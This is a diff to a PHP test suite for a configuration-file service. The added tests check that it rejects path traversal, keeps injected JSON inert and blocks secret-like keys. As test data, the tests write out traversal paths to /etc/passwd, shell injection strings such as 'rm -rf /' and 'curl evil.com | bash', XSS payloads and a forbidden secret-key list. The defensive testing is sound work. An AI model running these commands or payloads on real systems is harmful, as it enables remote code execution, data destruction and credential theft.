@@ -488,24 +488,14 @@ describe('ConfigFileService', function (): void {
                 File::deleteDirectory($projectLong->path);
             });
 
-            test('handles project path with parent directory references', function (): void {
+            test('rejects project path with parent directory references', function (): void {
                 $projectParentRef = Project::factory()->create([
                     'name' => 'Parent Ref Project',
                     'path' => $this->testDir.'/projects/../project-parent-ref',
                 ]);
 
-                // Create the actual directory
-                $actualPath = $this->testDir.'/project-parent-ref';
-                if (! File::isDirectory($actualPath)) {
-                    File::makeDirectory($actualPath, 0755, true);
-                }
-
-                $path = $this->service->resolvePath('test_project_config', $projectParentRef);
-
-                // The path is resolved exactly as provided by str_replace
-                expect($path)->toBe($projectParentRef->path.'/config.json');
-
-                File::deleteDirectory($actualPath);
+                expect(fn () => $this->service->resolvePath('test_project_config', $projectParentRef))
+                    ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
             });
         });
 
@@ -2647,5 +2637,605 @@ describe('ConfigFileService', function (): void {
                 expect(is_array($errors))->toBeTrue();
             });
         });
+    });
+});
+
+describe('path traversal prevention', function (): void {
+    beforeEach(function (): void {
+        $this->traversalTestDir = storage_path('testing/path-traversal');
+        if (! File::isDirectory($this->traversalTestDir)) {
+            File::makeDirectory($this->traversalTestDir, 0755, true);
+        }
+
+        config()->set('vibecodepc.config_files', [
+            'test_config' => [
+                'path' => $this->traversalTestDir.'/test.json',
+                'label' => 'Test Config',
+                'description' => 'Test configuration file',
+                'editable' => true,
+                'scope' => 'global',
+            ],
+            'test_project_config' => [
+                'path_template' => '{project_path}/config.json',
+                'label' => 'Test Project Config',
+                'description' => 'Test project-scoped configuration',
+                'editable' => true,
+                'scope' => 'project',
+            ],
+        ]);
+    });
+
+    afterEach(function (): void {
+        if (File::isDirectory($this->traversalTestDir)) {
+            File::deleteDirectory($this->traversalTestDir);
+        }
+    });
+
+    test('rejects path with double dot slash traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Traversal Test',
+            'path' => $this->traversalTestDir.'/projects/../etc',
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('rejects path with backslash traversal on Windows', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Windows Traversal Test',
+            'path' => $this->traversalTestDir.'\\..\\etc',
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('rejects path with URL-encoded traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'URL Encoded Traversal',
+            'path' => $this->traversalTestDir.'/%2e%2e%2f/etc',
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('rejects path with double URL-encoded traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Double Encoded Traversal',
+            'path' => $this->traversalTestDir.'/%252e%252e%252f/etc',
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('rejects path with null bytes', function (): void {
+        // Null byte attack - inject null byte before traversal
+        // The null byte terminates the string in C, potentially bypassing checks
+        $project = Project::factory()->create([
+            'name' => 'Null Byte Test',
+            'path' => $this->traversalTestDir."/safe\x00/etc",
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains null bytes');
+    });
+
+    test('allows valid paths without traversal sequences', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Valid Path',
+            'path' => $this->traversalTestDir.'/my-project/subdir',
+        ]);
+
+        $path = $this->service->resolvePath('test_project_config', $project);
+        expect($path)->toBe($this->traversalTestDir.'/my-project/subdir/config.json');
+    });
+
+    test('allows single dot in path (current directory)', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Single Dot Path',
+            'path' => $this->traversalTestDir.'/./my-project',
+        ]);
+
+        $path = $this->service->resolvePath('test_project_config', $project);
+        expect($path)->toBe($this->traversalTestDir.'/./my-project/config.json');
+    });
+
+    test('allows paths with dots in directory names', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Dot Directory',
+            'path' => $this->traversalTestDir.'/.hidden-dir/some.project',
+        ]);
+
+        $path = $this->service->resolvePath('test_project_config', $project);
+        expect($path)->toBe($this->traversalTestDir.'/.hidden-dir/some.project/config.json');
+    });
+
+    test('prevents traversal at beginning of path', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Leading Traversal',
+            'path' => '../etc/passwd',
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('prevents traversal at end of path', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Trailing Traversal',
+            'path' => $this->traversalTestDir.'/project/../../',
+        ]);
+
+        expect(fn () => $this->service->resolvePath('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('putContent rejects path with traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Traversal Config',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        expect(fn () => $this->service->putContent('test_project_config', '{"key": "value"}', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('getContent rejects path with traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Traversal Read',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        expect(fn () => $this->service->getContent('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('backup rejects path with traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Traversal Backup',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        expect(fn () => $this->service->backup('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('delete rejects path with traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Traversal Delete',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        expect(fn () => $this->service->delete('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('exists rejects path with traversal', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Traversal Exists',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        expect(fn () => $this->service->exists('test_project_config', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('restore rejects path with traversal', function (): void {
+        // First create a valid backup file
+        File::put($this->traversalTestDir.'/backup.json', '{"key": "value"}', true);
+
+        $project = Project::factory()->create([
+            'name' => 'Traversal Restore',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        expect(fn () => $this->service->restore('test_project_config', $this->traversalTestDir.'/backup.json', $project))
+            ->toThrow(\InvalidArgumentException::class, 'Path contains invalid directory traversal sequences');
+    });
+
+    test('listBackups does not check path traversal (uses project ID only)', function (): void {
+        // listBackups only uses project ID for suffix pattern, not path validation
+        $project = Project::factory()->create([
+            'name' => 'Traversal ListBackups',
+            'path' => $this->traversalTestDir.'/project/../etc',
+        ]);
+
+        // This should work because listBackups only uses project ID, not the path
+        // The backup directory lookup doesn't resolve the project path
+        $backups = $this->service->listBackups('test_project_config', $project);
+        expect(is_array($backups))->toBeTrue();
+    });
+
+    test('global configs bypass path traversal check', function (): void {
+        // Global configs should not have path validation (they use direct paths from config)
+        $path = $this->service->resolvePath('test_config');
+        expect($path)->toBe($this->traversalTestDir.'/test.json');
+    });
+});
+
+describe('security injection attack prevention', function (): void {
+    beforeEach(function (): void {
+        $this->testDir = storage_path('testing/config');
+        if (! File::isDirectory($this->testDir)) {
+            File::makeDirectory($this->testDir, 0755, true);
+        }
+        File::put($this->testDir.'/test.json', '{}', true);
+    });
+
+    test('JSON payload with command injection attempt is saved but treated as plain string', function (): void {
+        // Command injection attempt via JSON values
+        $payloads = [
+            '{"cmd": "$(whoami)"}',
+            '{"cmd": "`id`"}',
+            '{"cmd": "| cat /etc/passwd"}',
+            '{"cmd": "; rm -rf /"}',
+            '{"cmd": "\u0024\u0028whoami\u0029"}',
+            '{"cmd": "$(echo pwned)"}',
+            '{"cmd": "&& ls -la"}',
+        ];
+
+        foreach ($payloads as $json) {
+            // JSON values are just strings - no command execution should happen
+            $result = $this->service->validateJson($json);
+            expect($result)->toBeArray();
+            // Verify the payload was parsed as a string (not executed)
+            expect($result['cmd'])->toBeString();
+        }
+    });
+
+    test('JSON with script tags in values is treated as plain text', function (): void {
+        // XSS attempt via JSON values
+        $payloads = [
+            '{"name": "<script>alert(1)</script>"}' => '<script>',
+            '{"data": "<img src=x onerror=alert(1)>"}' => '<img',
+            '{"url": "javascript:void(0)"}' => 'javascript:',
+            '{"content": "<?php echo \'hack\'; ?>"}' => '<?php',
+            '{"html": "<iframe src=\'evil.com\'></iframe>"}' => '<iframe',
+        ];
+
+        foreach ($payloads as $json => $expectedContent) {
+            // Script tags in JSON values are just strings - no XSS risk in JSON itself
+            $result = $this->service->validateJson($json);
+            expect($result)->toBeArray();
+            // Verify the malicious content is stored as-is (JSON doesn't execute it)
+            expect($result[array_key_first($result)])->toContain($expectedContent);
+        }
+    });
+
+    test('copilot instructions file allows markdown content without execution', function (): void {
+        // Markdown with HTML/JS injection attempt
+        $markdown = <<<'MD'
+# Copilot Instructions
+
+<script>alert('XSS')</script>
+
+```javascript
+eval('malicious code')
+```
+
+[Link](javascript:alert(1))
+
+<img src=x onerror=alert(1)>
+
+<!-- html comment with "quotes" -->
+MD;
+
+        // Markdown is saved as-is, no execution happens
+        $this->service->putContent('copilot_instructions', $markdown);
+        $content = $this->service->getContent('copilot_instructions');
+
+        expect($content)->toContain('<script>');
+        expect($content)->toContain('javascript:');
+        expect($content)->toContain('onerror');
+        expect($content)->toBe($markdown);
+    });
+
+    test('malicious shell commands in JSON values are not executed', function (): void {
+        // Test that shell commands remain as strings
+        $json = '{"command": "rm -rf /", "execute": "curl evil.com | bash"}';
+
+        $result = $this->service->validateJson($json);
+
+        // The dangerous values should be preserved as strings, not executed
+        expect($result['command'])->toBe('rm -rf /');
+        expect($result['execute'])->toBe('curl evil.com | bash');
+    });
+
+    test('config keys with special characters are handled safely', function (): void {
+        // Keys with special characters that could cause issues
+        $testCases = [
+            '{"key\t": "value1"}',
+            '{"key\n": "value2"}',
+            '{"key\\r": "value3"}',
+            '{"key with spaces": "value4"}',
+            '{"unicode_日本語": "value5"}',
+            '{"emoji_": "value6"}',
+        ];
+
+        foreach ($testCases as $json) {
+            // These should parse without error
+            $result = $this->service->validateJson($json);
+            expect($result)->toBeArray();
+            expect(count($result))->toBe(1);
+        }
+    });
+
+    test('malformed JSON is rejected before any processing', function (): void {
+        $malformed = [
+            '{"key": "unclosed string}',
+            '{key: value}', // Missing quotes
+            '{"key": undefined}', // JavaScript, not JSON
+            '{"key": function(){}}', // Not valid JSON
+            '{"key": new Date()}', // Not valid JSON
+            '{"key": NaN}', // Not valid JSON
+            '{"key": Infinity}', // Not valid JSON
+        ];
+
+        foreach ($malformed as $json) {
+            expect(fn () => $this->service->validateJson($json))
+                ->toThrow(\JsonException::class);
+        }
+    });
+
+    test('null bytes in JSON content are preserved', function (): void {
+        // Null bytes could be used in attacks
+        $json = '{"key": "value\u0000hidden"}';
+
+        $result = $this->service->validateJson($json);
+
+        // JSON null byte is just a character in the string
+        expect($result['key'])->toBe("value\x00hidden");
+    });
+
+    test('deeply nested objects do not cause stack overflow', function (): void {
+        // Create deeply nested JSON (100 levels)
+        $deep = str_repeat('{"nested":', 100).'"value"'.str_repeat('}', 100);
+
+        // Should complete without error
+        $result = $this->service->validateJson($deep);
+        expect($result)->toBeArray();
+    });
+
+    test('extremely long keys do not cause memory issues', function (): void {
+        // Key with 10,000 characters
+        $longKey = str_repeat('x', 10000);
+        $json = '{"'.addcslashes($longKey, '"').'": "value"}';
+
+        // Should parse without memory issues
+        $result = $this->service->validateJson($json);
+        expect($result)->toHaveKey($longKey);
+    });
+
+    test('JSON with duplicate keys uses last value', function (): void {
+        // JSON technically doesn't allow duplicate keys, but PHP json_decode uses last
+        $json = '{"key": "first", "key": "second"}';
+
+        $result = $this->service->validateJson($json);
+
+        // Last value wins
+        expect($result['key'])->toBe('second');
+    });
+
+    test('unicode escape sequences are decoded correctly', function (): void {
+        // Unicode escapes that could be used for attacks
+        $json = '{"key": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}';
+
+        $result = $this->service->validateJson($json);
+
+        // Should decode to actual characters
+        expect($result['key'])->toBe('<script>alert(1)</script>');
+    });
+
+    test('file path injection via config key is prevented', function (): void {
+        // Attempt to use config key as path
+        expect(fn () => $this->service->getContent('../../../etc/passwd'))
+            ->toThrow(\InvalidArgumentException::class, 'Unknown configuration key');
+
+        expect(fn () => $this->service->putContent('../../../etc/passwd', '{}'))
+            ->toThrow(\InvalidArgumentException::class, 'Unknown configuration key');
+    });
+
+    test('backup path injection is prevented by validation', function (): void {
+        // Attempt to restore from malicious backup path
+        expect(fn () => $this->service->restore('test_config', '../../../etc/passwd'))
+            ->toThrow(\RuntimeException::class);
+    });
+
+    test('config key must be exact match - prevents partial injection', function (): void {
+        // Trying to use partial key match
+        expect(fn () => $this->service->getContent('test'))
+            ->toThrow(\InvalidArgumentException::class);
+
+        expect(fn () => $this->service->getContent('test_config_suffix'))
+            ->toThrow(\InvalidArgumentException::class);
+    });
+});
+
+describe('secret detection in save operations', function (): void {
+    test('putContent blocks api_key in various formats', function (): void {
+        $apiKeyVariants = [
+            '{"api_key": "secret123"}' => 'snake_case api_key',
+            '{"api-key": "secret123"}' => 'kebab-case api-key',
+            '{"apiKey": "secret123"}' => 'camelCase apiKey',
+            '{"API_KEY": "secret123"}' => 'UPPERCASE API_KEY',
+            '{"Api_Key": "secret123"}' => 'PascalCase Api_Key',
+            '{"apiKEY": "secret123"}' => 'mixed case apiKEY',
+        ];
+
+        foreach ($apiKeyVariants as $json => $description) {
+            expect(fn () => $this->service->putContent('test_config', $json))
+                ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected', "Failed for: {$description}");
+
+            // Verify no file was created
+            expect(File::exists($this->testDir.'/test.json'))->toBeFalse("File should not exist for: {$description}");
+        }
+    });
+
+    test('putContent blocks api_secret in various formats', function (): void {
+        $apiSecretVariants = [
+            '{"api_secret": "shh"}' => 'snake_case api_secret',
+            '{"api-secret": "shh"}' => 'kebab-case api-secret',
+            '{"apiSecret": "shh"}' => 'camelCase apiSecret',
+            '{"API_SECRET": "shh"}' => 'UPPERCASE API_SECRET',
+        ];
+
+        foreach ($apiSecretVariants as $json => $description) {
+            expect(fn () => $this->service->putContent('test_config', $json))
+                ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected', "Failed for: {$description}");
+        }
+    });
+
+    test('putContent blocks tokens in nested objects', function (): void {
+        $nestedTokenPayloads = [
+            '{"config": {"api_token": "nested_secret"}}' => 'single nested api_token',
+            '{"settings": {"auth": {"access_token": "deep_secret"}}}' => 'deeply nested access_token',
+            '{"data": {"items": [{"bearer_token": "array_item"}]}}' => 'token in array item',
+            '{"level1": {"level2": {"level3": {"auth_token": "very_deep"}}}}' => '4 levels deep auth_token',
+            '{"services": {"github": {"client_secret": "oauth_secret"}}}' => 'oauth client_secret',
+        ];
+
+        foreach ($nestedTokenPayloads as $json => $description) {
+            expect(fn () => $this->service->putContent('test_config', $json))
+                ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected', "Failed for: {$description}");
+
+            expect(File::exists($this->testDir.'/test.json'))->toBeFalse("File should not exist for: {$description}");
+        }
+    });
+
+    test('putContent blocks all forbidden key patterns', function (): void {
+        $forbiddenPatterns = [
+            // API-related
+            '{"api_key": "value"}' => 'api_key',
+            '{"api_secret": "value"}' => 'api_secret',
+            '{"api_token": "value"}' => 'api_token',
+
+            // Auth tokens
+            '{"auth_token": "value"}' => 'auth_token',
+            '{"access_token": "value"}' => 'access_token',
+            '{"bearer_token": "value"}' => 'bearer_token',
+
+            // Keys
+            '{"private_key": "value"}' => 'private_key',
+            '{"secret_key": "value"}' => 'secret_key',
+            '{"client_secret": "value"}' => 'client_secret',
+
+            // General secrets
+            '{"password": "value"}' => 'password',
+            '{"secret": "value"}' => 'secret',
+            '{"token": "value"}' => 'token',
+        ];
+
+        foreach ($forbiddenPatterns as $json => $pattern) {
+            expect(fn () => $this->service->putContent('test_config', $json))
+                ->toThrow(\InvalidArgumentException::class, "Forbidden key detected: '{$pattern}'");
+        }
+    });
+
+    test('putContent blocks secrets mixed with valid data', function (): void {
+        $mixedPayloads = [
+            '{"name": "test", "api_key": "secret", "enabled": true}' => 'secret in middle',
+            '{"password": "hunter2", "users": ["alice", "bob"]}' => 'secret at start',
+            '{"settings": {"api_key": "key", "timeout": 30}}' => 'secret in nested object',
+            '{"config": {"database": {"password": "db_secret"}, "host": "localhost"}}' => 'deeply nested secret',
+        ];
+
+        foreach ($mixedPayloads as $json => $description) {
+            expect(fn () => $this->service->putContent('test_config', $json))
+                ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected', "Failed for: {$description}");
+
+            // Verify partial writes don't happen
+            expect(File::exists($this->testDir.'/test.json'))->toBeFalse("File should not exist for: {$description}");
+        }
+    });
+
+    test('putContent allows legitimate config with similar-looking keys', function (): void {
+        $legitimatePayloads = [
+            '{"api_key_name": "API_KEY", "api_key_description": "docs"}' => 'keys about api_key',
+            '{"password_hint": "Your password should be strong", "password_policy": "complex"}' => 'password-related settings',
+            '{"token_expiry": 3600, "token_type": "bearer", "token_endpoint": "/auth"}' => 'token configuration',
+            '{"secret_question": "What is your favorite color?", "secret_answer_hash": "abc123"}' => 'security questions',
+            '{"private_key_file": "/path/to/key.pem", "private_key_path": "/secure"}' => 'key file paths',
+        ];
+
+        foreach ($legitimatePayloads as $json => $description) {
+            // Should NOT throw - these are legitimate config keys
+            $result = $this->service->validateJson($json);
+            expect($result)->toBeArray("Failed for: {$description}");
+
+            // Clean up for next iteration
+            if (File::exists($this->testDir.'/test.json')) {
+                File::delete($this->testDir.'/test.json');
+            }
+        }
+    });
+
+    test('putContent with expectedHash still validates forbidden keys before checking hash', function (): void {
+        // First create a valid file
+        File::put($this->testDir.'/test.json', '{"original": "data"}', true);
+        $originalContent = File::get($this->testDir.'/test.json');
+        $hash = $this->service->getContentHash($originalContent);
+
+        // Attempt to save with forbidden key - should fail validation before hash check
+        $maliciousJson = '{"api_key": "stolen_key"}';
+
+        expect(fn () => $this->service->putContent('test_config', $maliciousJson, null, $hash))
+            ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected');
+
+        // Verify original file unchanged
+        expect(File::get($this->testDir.'/test.json'))->toBe($originalContent);
+    });
+
+    test('putContent with project context blocks secrets', function (): void {
+        $project = Project::factory()->create([
+            'name' => 'Test Project',
+            'path' => $this->testDir.'/test-project',
+        ]);
+
+        if (! File::isDirectory($project->path)) {
+            File::makeDirectory($project->path, 0755, true);
+        }
+
+        config()->set('vibecodepc.config_files.project_secret_test', [
+            'path_template' => '{project_path}/secrets.json',
+            'label' => 'Secret Test',
+            'description' => 'Test secret detection',
+            'editable' => true,
+            'scope' => 'project',
+        ]);
+
+        // Use a forbidden key that matches the exact pattern
+        $json = '{"password": "super_secret"}';
+
+        expect(fn () => $this->service->putContent('project_secret_test', $json, $project))
+            ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected');
+
+        // Cleanup
+        File::deleteDirectory($project->path);
+    });
+
+    test('concurrent save with secret is blocked before any file operations', function (): void {
+        // Create a valid file first
+        File::put($this->testDir.'/test.json', '{"valid": "data"}', true);
+        $originalContent = File::get($this->testDir.'/test.json');
+        $hash = $this->service->getContentHash($originalContent);
+
+        // Attempt concurrent save with secret
+        $secretJson = '{"secret_key": "intercepted"}';
+
+        expect(fn () => $this->service->putContent('test_config', $secretJson, null, $hash))
+            ->toThrow(\InvalidArgumentException::class, 'Forbidden key detected');
+
+        // Verify file was not modified
+        expect(File::get($this->testDir.'/test.json'))->toBe($originalContent);
+
+        // Verify no backup was created for this failed attempt
+        $backups = $this->service->listBackups('test_config');
+        $secretRelatedBackups = array_filter($backups, function ($backup) {
+            return strpos(File::get($backup['path']), 'secret_key') !== false;
+        });
+        expect($secretRelatedBackups)->toBe([]);
     });
 });
